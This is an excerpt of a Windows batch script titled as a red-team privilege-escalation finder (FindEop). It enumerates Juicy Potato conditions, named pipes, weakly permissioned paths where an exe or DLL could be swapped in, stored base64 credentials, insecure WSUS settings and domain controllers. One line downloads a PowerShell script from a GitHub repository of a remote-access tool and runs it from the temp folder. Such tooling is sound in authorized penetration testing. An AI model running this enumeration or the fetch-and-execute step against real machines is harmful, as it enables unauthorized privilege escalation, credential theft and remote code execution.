...
:: ----
TITLE FindEop v1.3.12 {SSA RedTeam @2022}


:: Local variables
SET LocalPath=%cd%
SET BatVersion=v1.3.12
...
echo JUICY POTATO GOLDEN PRIVILEGE
powershell -C "Write-Host 'Only vuln under UserLand token' -ForeGroundColor Yellow"
echo ------------------------------
...
powershell -C "$CheckPipes = (Get-ChildItem \\.\pipe\ -EA SilentlyContinue).FullName;If($CheckPipes){Write-Host 'Pipes Manipulation => [VULNERABLE::TA0004]' -ForeGroundColor Green -BackGroundColor Black;$Report = $CheckPipes|Select -Skip 1|Select -First 5;echo $Report}Else{Write-Host 'ERROR: None Name Pipes found ..'}"
echo.
echo.
...
where /q icacls
IF ERRORLEVEL 1 (
    powershell -C "Write-Host 'icacls is missing, performing checks using cacls.' -ForeGroundColor Yellow"
...
powershell -C "Write-Host 'Place exe or DLL to exec instead of legitimate' -ForeGroundColor Yellow"
echo ----------------------------------------------
...
powershell -C "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1 -OutFile $Env:TMP\ACLMitreT1574.ps1;powershell -File $Env:tmp\ACLMitreT1574.ps1"
...
powershell -C "Write-Host 'Creds are stored in base64 and can be decoded manually.' -ForeGroundColor Yellow"
echo -------------------------------------------------------
...
echo ------------------------------------------------
powershell -C "$CheckRegKey = reg query 'HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate' /v wuserver | findstr /i /C:'http://';If($CheckRegKey){Write-Host $CheckRegKey -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host 'ERROR: The system was unable to find the specified registry key or value.'}"
echo.
echo.
...
echo ----------------------
powershell -C "$DomainControler = $Env:USERDOMAIN;Write-Host ::DCName::[$DomainControler] -ForeGroundColor Yellow;nltest /DCNAME:$DomainControler|Out-Null;nltest /DSGETDC:$DomainControler|Out-Null;nltest /DCLIST:$DomainControler|Out-Null"
echo.
echo.
